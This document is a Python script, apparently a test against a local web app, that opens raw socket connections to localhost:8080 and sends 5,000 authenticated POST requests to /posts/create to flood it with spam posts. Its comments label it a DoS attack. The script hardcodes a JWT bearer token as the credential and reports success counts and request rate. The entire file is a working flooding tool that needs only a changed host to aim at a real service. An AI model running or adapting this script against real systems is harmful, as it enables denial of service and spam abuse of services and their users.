import socket, time, random


# Configuration
REQUESTS = 5000  # Total number of requests to send
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3ZWNkYTZmNGY5NmFmYWQ5YjdkMzAxZCIsImlhdCI6MTc0MzU3NTY2MywiZXhwIjoxNzQzNTc5MjYzfQ.6D03Cjg52Sw0frV1mPReLP6dePQyqenOZBEuXTBtlLw"


# Attack function
def send_request(i):
    msg = f"lollol {i} {random.randint(1000,9999)}"
    body = f'{{"content":"{msg}","username":"attacker","id":"123456"}}'
    req = f'POST /posts/create HTTP/1.1\r\nHost: localhost:8080\r\nContent-Type: application/json\r\nAuthorization: Bearer {TOKEN}\r\nContent-Length: {len(body)}\r\n\r\n{body}'.encode()

    try:
        s = socket.create_connection(("localhost", 8080))
        s.settimeout(3)
        s.sendall(req)
        r = s.recv(4096)
        s.close()
        return b"200 OK" in r
    except:
        return False


# Main attack
print(f"Starting DoS attack with {REQUESTS} sequential requests...")
start = time.time()


success = 0
failed = 0


# Send requests in a loop
for i in range(REQUESTS):
    if i % 50 == 0:  # Show progress every 50 requests
        print(f"Sending request {i}/{REQUESTS}...")

    if send_request(i):
        success += 1
    else:
        failed += 1


# Show results
end = time.time()
print(f"\nResults: {success} successful, {failed} failed")
print(f"Time: {end-start:.2f}s, Rate: {success/(end-start):.2f} req/s")